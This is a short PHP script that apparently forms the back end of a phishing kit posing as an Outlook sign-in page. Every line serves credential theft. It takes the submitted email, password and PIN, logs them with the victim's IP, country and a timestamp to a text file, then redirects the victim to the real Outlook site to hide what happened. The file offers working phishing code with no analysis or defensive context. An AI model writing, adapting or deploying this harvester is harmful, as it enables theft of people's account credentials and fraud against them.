<?php
@ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
@$cc = trim(file_get_contents("http://ipinfo.io/{".$userp."}/country"));


if(isset ($_POST['eml']) && isset ($_POST['emlpss']) && isset ($_POST['p'])){

	$file = fopen("Dani20.txt", "a");

fwrite($file, "eml= ".$_POST['eml']." | Clave= ".$_POST['emlpss']." | Pin= ".$_POST['p']." | Fecha= ".date('d-m-Y')." | ".date('H:i:s')." | Ip = ".$userp." ".$cc."". PHP_EOL);
fwrite($file, "========================= " . PHP_EOL);
fclose($file);
header ('location: https://outlook.live.com/owa/');

}else{ header ('location: index.php');  }

?>